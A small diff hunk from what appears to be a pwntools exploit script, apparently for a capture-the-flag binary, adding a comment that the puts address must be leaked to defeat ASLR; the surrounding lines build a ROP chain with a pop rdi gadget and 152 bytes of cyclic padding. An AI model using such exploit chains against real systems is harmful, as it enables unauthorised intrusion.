@@ -69,6 +69,7 @@ buffer = ROP(elf)
 #gadget 0x0000000000400853: pop rdi; ret; 
 pop_rdi = p64(buffer.rdi.address)
 
+#we need to leak the puts because it changes everytime due to aslr
 #=============== L E A K ===============
 buffer.raw(cyclic(152))
 buffer.raw(pop_rdi)
